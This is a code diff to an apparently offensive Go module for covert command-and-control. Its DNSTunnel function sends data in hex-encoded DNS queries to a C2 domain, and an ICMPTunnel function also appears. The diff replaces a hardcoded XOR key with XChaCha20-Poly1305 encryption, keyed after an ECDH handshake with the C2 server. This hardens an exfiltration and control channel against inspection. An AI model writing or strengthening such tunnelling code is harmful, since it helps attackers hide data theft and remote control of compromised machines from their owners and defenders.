@@ -6,6 +6,7 @@ import (
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
+	"errors"
 	"fmt"
 	"io"
 	"math/big"
@@ -15,6 +16,8 @@ import (
 	"strings"
 	"sync"
 	"time"
+
+	"golang.org/x/crypto/chacha20poly1305"
 )
 
 var stealthC2Mu sync.Mutex
@@ -27,20 +30,70 @@ func init() {
 	dnsSessionID = hex.EncodeToString(b)[:8]
 }
 
+// dnsTunnelKey is a per-process ephemeral 32-byte key for DNS tunnel encryption.
+// In production wire this from the X25519 session shared secret.
+var dnsTunnelKey [32]byte
+
+func init() {
+	if _, err := io.ReadFull(rand.Reader, dnsTunnelKey[:]); err != nil {
+		panic("stealth_c2: failed to generate DNS tunnel key")
+	}
+}
+
+// tunnelEncrypt encrypts data with XChaCha20-Poly1305 using the given 32-byte key.
+// Output layout: [24-byte nonce][ciphertext+tag].
+func tunnelEncrypt(key *[32]byte, plaintext []byte) ([]byte, error) {
+	aead, err := chacha20poly1305.NewX(key[:])
+	if err != nil {
+		return nil, fmt.Errorf("tunnel encrypt init: %w", err)
+	}
+	nonce := make([]byte, aead.NonceSize())
+	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
+		return nil, fmt.Errorf("tunnel nonce: %w", err)
+	}
+	return aead.Seal(nonce, nonce, plaintext, nil), nil
+}
+
+// tunnelDecrypt decrypts data produced by tunnelEncrypt.
+func tunnelDecrypt(key *[32]byte, ciphertext []byte) ([]byte, error) {
+	aead, err := chacha20poly1305.NewX(key[:])
+	if err != nil {
+		return nil, fmt.Errorf("tunnel decrypt init: %w", err)
+	}
+	nonceSize := aead.NonceSize()
+	if len(ciphertext) < nonceSize+aead.Overhead() {
+		return nil, errors.New("tunnel decrypt: ciphertext too short")
+	}
+	return aead.Open(nil, ciphertext[:nonceSize], ciphertext[nonceSize:], nil)
+}
+
+// SetDNSTunnelKey wires an external key (e.g. X25519 shared secret) into the
+// DNS tunnel. Call this after completing the ECDH handshake with the C2.
+func SetDNSTunnelKey(key [32]byte) {
+	stealthC2Mu.Lock()
+	dnsTunnelKey = key
+	stealthC2Mu.Unlock()
+}
+
 func DNSTunnel(ctx context.Context, data []byte, c2Domain string) ([]byte, error) {
 	stealthC2Mu.Lock()
 	defer stealthC2Mu.Unlock()
 
 	// Rate limit: 1 query per 500ms
 	if time.Since(lastDNSQuery) < 500*time.Millisecond {
-		time.Sleep(500 * time.Millisecond - time.Since(lastDNSQuery))
+		time.Sleep(500*time.Millisecond - time.Since(lastDNSQuery))
 	}
 	lastDNSQuery = time.Now()
 
-	// Encrypt data with session key
-	encrypted := xorEncrypt(data, []byte("X404X"))
+	// Encrypt with ChaCha20-Poly1305 (key held under the mutex, safe to copy)
+	key := dnsTunnelKey
+	encrypted, err := tunnelEncrypt(&key, data)
+	if err != nil {
+		return nil, fmt.Errorf("DNS tunnel encrypt: %w", err)
+	}
 
 	// Split into 32-byte hex-encoded chunks
+	// (nonce is prepended, so first chunks carry the nonce — server reassembles before decrypt)
 	const chunkSize = 32
 	var responses []byte
 
@@ -62,7 +115,6 @@ func DNSTunnel(ctx context.Context, data []byte, c2Domain string) ([]byte, error
 		}
 
 		for _, record := range records {
-			// Decode hex response
 			respBytes, err := hex.DecodeString(record)
 			if err != nil {
 				continue
@@ -75,7 +127,7 @@ func DNSTunnel(ctx context.Context, data []byte, c2Domain string) ([]byte, error
 		return nil, fmt.Errorf("no DNS responses")
 	}
 
-	return xorEncrypt(responses, []byte("X404X")), nil
+	return tunnelDecrypt(&key, responses)
 }
 
 func ICMPTunnel(ctx context.Context, data []byte, targetIP string) ([]byte, error) {
@@ -275,12 +327,4 @@ func icmpChecksum(data []byte) uint16 {
 	sum = (sum >> 16) + (sum & 0xFFFF)
 	sum += sum >> 16
 	return uint16(^sum)
-}
-
-func xorEncrypt(data, key []byte) []byte {
-	result := make([]byte, len(data))
-	for i := 0; i < len(data); i++ {
-		result[i] = data[i] ^ key[i%len(key)]
-	}
-	return result
 }
